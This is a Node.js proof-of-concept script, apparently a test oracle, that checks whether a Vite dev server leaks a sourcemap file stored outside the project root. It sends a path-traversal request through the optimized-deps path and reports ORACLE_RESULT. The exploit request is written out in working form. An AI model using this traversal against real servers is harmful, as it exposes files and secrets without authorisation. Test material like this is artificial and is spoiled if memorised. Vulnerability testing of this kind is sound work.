const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const vite = require('vite');

    const marker = 'vite-ghsa-4w7w-66w2-5vf9-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'project');
    const outsideMap = path.join(base, 'secret-outside.map');

    fs.mkdirSync(root, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');
    fs.writeFileSync(outsideMap, JSON.stringify({ key: 'unsafe', marker }));

    const server = await vite.createServer({
      root,
      appType: 'spa',
      server: { host: '127.0.0.1', port: 0, fs: { strict: true } },
      logLevel: 'silent'
    });

    try {
      await server.listen();

      const benignUrl = '/';
      const benignRes = await server.transformRequest(benignUrl);
      if (!benignRes || typeof benignRes !== 'object') {
        throw new Error('benign transform did not return result');
      }

      operation_completed = true;

      const rel = path.relative(root, outsideMap).split(path.sep).join('/');
      const payloadUrl = '/node_modules/.vite/deps/' + rel;

      try {
        const maliciousRes = await server.transformRequest(payloadUrl);
        if (maliciousRes && typeof maliciousRes.code === 'string' && maliciousRes.code.includes(marker)) {
          exploit_succeeded = true;
          evidence = 'outside .map content was returned via optimized-deps sourcemap path';
        } else {
          exploit_succeeded = false;
          evidence = 'malicious .map request did not expose marker content';
        }
      } catch (e) {
        exploit_succeeded = false;
        evidence = 'malicious request blocked with exception';
      }
    } finally {
      try { await server.close(); } catch (_) {}
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();